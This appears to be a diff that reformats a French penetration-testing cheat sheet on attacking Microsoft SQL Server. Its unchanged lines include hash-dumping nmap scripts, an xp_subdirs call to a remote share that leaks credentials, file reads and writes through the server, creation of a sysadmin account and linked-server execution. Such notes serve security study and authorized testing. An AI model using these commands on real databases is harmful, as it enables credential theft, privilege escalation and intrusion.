@@ -9,13 +9,14 @@ Port : 1433
 
 ### Sans accès initial
 
-
 #### nmap
+
 ```shell-session
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP
 ```
 
 #### metasploit
+
 ```shell-session
 msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
 
@@ -35,13 +36,14 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 [*] Auxiliary module execution completed
 ```
 
-### Avec accès 
+### Avec accès
 
 Si on dispose d'un accès via un des outils présentés plus bas sur cette page, on pourra utiliser les commandes suivantes pour découvrir l'environnement de base de données accessible.
 
 #### Requêtes utiles
 
 ##### Informations générales
+
 ```sql
 -- Get version
 select @@version;
@@ -73,6 +75,7 @@ SELECT name,is_linked,is_remote_login_enabled, FROM sys.servers WHERE isremote =
 Si un serveur lié (Linked Server) est découvert, on pourra tenter d'y accéder, vérifier si nous disposons de privilèges différents sur celui-ci. Voir la partie `Exploitation` plus bas sur cette page.
 
 ##### Exploration de l'instance de base de donnée
+
 ```sql
 -- Get databases
 select name from sys.databases;
@@ -92,7 +95,9 @@ SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
 #### sqlcmd
 
 Utilitaire installer avec SQLServer
+
 Il faudra ajouter le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
+
 ```shell
 # -y 30 -Y 30 augmentent la visibilité des résultat (attention aux performances)
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
@@ -105,6 +110,7 @@ sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 #### sqsh
 
 Equivalent de sqlcmd sous Windows, pour Linux.
+
 Comme sous windows, on ajoutera le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
 
 ```bash
@@ -168,6 +174,7 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 ```
 
 #### Ecriture dans un fichier
+
 ```sql
 ------------------------------------------------------------------------
 -- Creation de fichier via OLE Automation Procedures
@@ -195,6 +202,7 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ```
 
 #### Création de compte
+
 ```sql
 ------------------------------------------------------------------------
 -- Create user with sysadmin privs
@@ -216,16 +224,15 @@ REVERT; -- retourne aux droits précédents
 ```
 
 ### Linked Server
+
 Si on a un serveur lié (voir énumération sur cette page), on peut exécuter des requêtes à distance sur cette machine :
 
 ```sql
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 ```
 
-
 There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.
-
 
 ## Voir aussii
 
-https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+<https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet>
